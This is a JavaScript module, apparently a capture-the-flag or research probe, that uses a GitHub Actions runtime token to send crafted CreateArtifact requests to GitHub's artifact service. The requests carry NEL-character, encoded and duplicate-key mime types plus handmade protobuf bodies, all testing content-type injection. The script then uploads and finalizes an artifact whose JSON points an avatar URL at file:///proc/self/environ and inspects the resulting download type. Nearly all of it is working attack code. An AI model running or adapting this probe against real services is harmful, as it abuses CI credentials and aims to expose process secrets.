module.exports = async function scan() {
  const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
  const resultsUrl = process.env.ACTIONS_RESULTS_URL;
  const claims = JSON.parse(Buffer.from(runtimeToken.split('.')[1], 'base64url').toString('utf8'));
  const scope = claims.scp.split(' ').find(x => x.startsWith('Actions.Results:'));
  const [, runId, jobId] = scope.split(':');
  const url = `${new URL(resultsUrl).origin}/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact`;
  const ids = {workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId};
  const weird = 'application/json\u0085';
  const safe = 'application/json';
  const candidates = [
    ['literal-nel', JSON.stringify({...ids, name: 'vs-literal-nel', version: 7, mime_type: weird})],
    ['unicode-escape', JSON.stringify({...ids, name: 'vs-unicode-escape', version: 7, mime_type: weird}).replace('\\u0085', '\\u0085')],
    ['percent-encoded', JSON.stringify({...ids, name: 'vs-percent-encoded', version: 7, mime_type: 'application/json%C2%85'})],
    ['html-entity', JSON.stringify({...ids, name: 'vs-html-entity', version: 7, mime_type: 'application/json&#133;'})],
    ['quoted-whole', JSON.stringify({...ids, name: 'vs-quoted-whole', version: 7, mime_type: `"${weird}"`})],
    ['alias-safe-then-bad', `{"workflow_run_backend_id":"${runId}","workflow_job_run_backend_id":"${jobId}","name":"vs-alias-a","version":7,"mime_type":"${safe}","mimeType":"${weird}"}`],
    ['alias-bad-then-safe', `{"workflow_run_backend_id":"${runId}","workflow_job_run_backend_id":"${jobId}","name":"vs-alias-b","version":7,"mime_type":"${weird}","mimeType":"${safe}"}`],
    ['duplicate-safe-then-bad', `{"workflow_run_backend_id":"${runId}","workflow_job_run_backend_id":"${jobId}","name":"vs-dupe-a","version":7,"mime_type":"${safe}","mime_type":"${weird}"}`],
    ['duplicate-bad-then-safe', `{"workflow_run_backend_id":"${runId}","workflow_job_run_backend_id":"${jobId}","name":"vs-dupe-b","version":7,"mime_type":"${weird}","mime_type":"${safe}"}`],
  ];
  for (const [label, body] of candidates) {
    const response = await fetch(url, {method: 'POST', headers: {'Authorization': `Bearer ${runtimeToken}`, 'Content-Type': 'application/json'}, body});
    const result = await response.json().catch(() => ({}));
    console.log(`${label}: HTTP ${response.status}; ${result.msg || ''}; accepted=${Boolean(result.ok)}`);
  }

  function varint(value) {
    const out = [];
    while (value >= 128) { out.push((value & 127) | 128); value = Math.floor(value / 128); }
    out.push(value);
    return Buffer.from(out);
  }
  function field(number, data) {
    const bytes = Buffer.isBuffer(data) ? data : Buffer.from(data);
    return Buffer.concat([varint(number * 8 + 2), varint(bytes.length), bytes]);
  }
  function proto(name, mimeBuffers) {
    const pieces = [field(1, runId), field(2, jobId), field(3, name), Buffer.from([0x28, 0x07])];
    for (const mime of mimeBuffers) pieces.push(field(6, field(1, mime)));
    return Buffer.concat(pieces);
  }
  const binary = [
    ['binary-safe', proto('vs-bin-safe', [Buffer.from(safe)])],
    ['binary-nel', proto('vs-bin-nel', [Buffer.from(weird)])],
    ['binary-latin1-nel', proto('vs-bin-latin1-nel', [Buffer.from([...Buffer.from(safe), 0x85])])],
    ['binary-overlong-nel', proto('vs-bin-overlong-nel', [Buffer.from([...Buffer.from(safe), 0xc0, 0x85])])],
    ['binary-safe-then-nel', proto('vs-bin-dupe-a', [Buffer.from(safe), Buffer.from(weird)])],
    ['binary-nel-then-safe', proto('vs-bin-dupe-b', [Buffer.from(weird), Buffer.from(safe)])],
  ];
  for (const [label, body] of binary) {
    const response = await fetch(url, {method: 'POST', headers: {'Authorization': `Bearer ${runtimeToken}`, 'Content-Type': 'application/protobuf'}, body});
    const result = Buffer.from(await response.arrayBuffer());
    console.log(`${label}: HTTP ${response.status}; type=${response.headers.get('content-type')}; bytes=${result.byteLength}`);
    if (label === 'binary-nel-then-safe' && response.ok) {
      function readVarint(bytes, pos) {
        let value = 0, shift = 0, byte;
        do { byte = bytes[pos++]; value += (byte & 127) * 2 ** shift; shift += 7; } while (byte & 128);
        return [value, pos];
      }
      let signedUploadUrl = '';
      for (let pos = 0; pos < result.length;) {
        let tag; [tag, pos] = readVarint(result, pos);
        const fieldNo = tag >> 3, wire = tag & 7;
        if (wire === 0) { [, pos] = readVarint(result, pos); continue; }
        if (wire !== 2) throw new Error(`Unexpected response wire ${wire}`);
        let len; [len, pos] = readVarint(result, pos);
        if (fieldNo === 2) signedUploadUrl = result.subarray(pos, pos + len).toString();
        pos += len;
      }
      if (!signedUploadUrl) throw new Error('No signed upload URL');
      const blob = Buffer.from('{"full_name":"x/y","owner":{"avatar_url":"file:///proc/self/environ"}}');
      const put = await fetch(signedUploadUrl, {method: 'PUT', headers: {'Content-Type': 'application/octet-stream', 'x-ms-version': '2025-01-05', 'x-ms-blob-type': 'BlockBlob', 'x-ms-blob-content-type': weird}, body: blob});
      console.log(`binary-dupe finalize PUT: HTTP ${put.status}`);
      if (!put.ok) continue;
      const finalized = await fetch(url.replace('/CreateArtifact', '/FinalizeArtifact'), {method: 'POST', headers: {'Authorization': `Bearer ${runtimeToken}`, 'Content-Type': 'application/json'}, body: JSON.stringify({...ids, name: 'vs-bin-dupe-b', size: String(blob.length)})});
      const finalResult = await finalized.json();
      console.log(`binary-dupe Finalize: HTTP ${finalized.status}; ok=${Boolean(finalResult.ok)}`);
      if (!finalized.ok || !finalResult.ok) continue;
      const id = String(finalResult.artifact_id || finalResult.artifactId);
      const download = await fetch(`https://api.github.com/repos/ijuns/repo-cassette-ctf-probe/actions/artifacts/${id}/zip`, {redirect: 'manual', headers: {'Authorization': `Bearer ${process.env.GH_TOKEN}`, 'Accept': 'application/vnd.github.v3+json'}});
      const location = download.headers.get('location');
      const rsct = location ? new URL(location).searchParams.get('rsct') : null;
      let rawType = null;
      if (location) rawType = (await fetch(location)).headers.get('content-type');
      console.log(`binary-dupe download: HTTP ${download.status}; rsct=${JSON.stringify(rsct)}; Content-Type=${JSON.stringify(rawType)}`);
    }
  }
};
